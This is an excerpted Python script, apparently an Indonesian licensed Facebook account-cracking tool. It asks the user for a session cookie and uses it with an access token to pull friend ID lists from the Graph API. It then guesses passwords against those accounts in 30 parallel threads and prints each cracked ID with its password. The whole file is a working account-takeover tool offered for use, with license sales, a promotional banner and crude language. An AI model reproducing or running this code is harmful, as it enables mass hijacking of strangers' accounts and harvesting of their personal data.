...
def license():#line:42
  try :#line:43
    ...
    os.system("git pull")
    print (f"""
[{b}1{U}]{b} Beli License
[{b}2{U}]{b} Masukan License
[{b}3{U}]{b} List Harga License {U}{H}{U}{H}
""")#line:49
...
╔══════════════════════════════════════════╗
║ Creator  : HafizdXD
║ Github   : https://githun.com/HafizdXD
║ Whatsapp : +6285758862225
║ Version  : 500.0                         
║ Status : \033[32mPremium                        
╚══════════════════════════════════════════╝
...
def login():
	try:
		...
		try:
			...
			banner()
			print(' %s# TIDAK ADA KONEKSI INTERNET ! '%(M))
			exit()
	except IOError:
		login_lagi334()
...
def login_lagi334():
	banner()
	try:
		cookie=input("%s [●] MASUKAN COOKIE%s"%(P,P))
		linex()
		...
		print('LOGIN BERHASIL!!!');time.sleep(1)
...
def menu(my_name,my_id):
	...
	banner()
	linex()
	print('%s[%s●%s] %sTERSAMBUNG KE INTERNET'%(P,P,P,P));time.sleep(0.02)
	print('%s[●] IP  %s'%(P,str(sh['origin'])))
	print('%s[●] ID  %s'%(P,my_id))
	linex()
	print('%s[%s01%s] %sCRACK PUBLIK'%(P,P,P,P));time.sleep(0.02)
	print('%s[%s02%s] %sCRACK MASSAL %sID'%(P,P,P,P,P));time.sleep(0.02)
	print('%s[%s03%s] %s\033[32mGABUNG GRUP WHATSAPP%s'%(P,P,P,P,P));time.sleep(0.02)
	print('%s[%s04%s] %s\33[1;96mChat ADMIN%s'%(P,P,P,P,P));time.sleep(0.02)
...
def dump_publik():
	try:
		...
		exit()
	linex()
	print(P+'['+P+'●'+P+'] ID NYA YG PUBLIK YA KONTOL')
...
def multidump():
	...
	for mnh in range(nanya_keun):
		mnh +=1
		print()
		pil = input('[%s●%s] MASUKKAN ID KE %s%s%s : '%(P,P,P,mnh,P))
		try:
			koh2 = requests.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
			for pi in koh2['friends']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
		except requests.exceptions.ConnectionError:
	...
	print()
	print(P+'['+P+'•'+P+'] Berhasil Mengumpulkan  : '+str(len(id)))
	setting()
...
def setting():
	...
	ioz = '[01]M-PRO(\033[32mRecomended)\n[02]B-PRO(\033[32mRecomended)'
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] Gunakan Comma Untuk Pemisah\n[•] Contoh Password\n[•] CONTOH: indonesia,Rahasia,Sayang123'
...
# WORDLIST
def passwrd():
	ler = '# CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	tanya = '# INGIN MENUNJUKAN OPSI CP  ? (y/t)'
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r{H}HORE AKUNNYA OK  [HAFIZD-XD-OK] {idf} | {pw}SANDI : {N}')
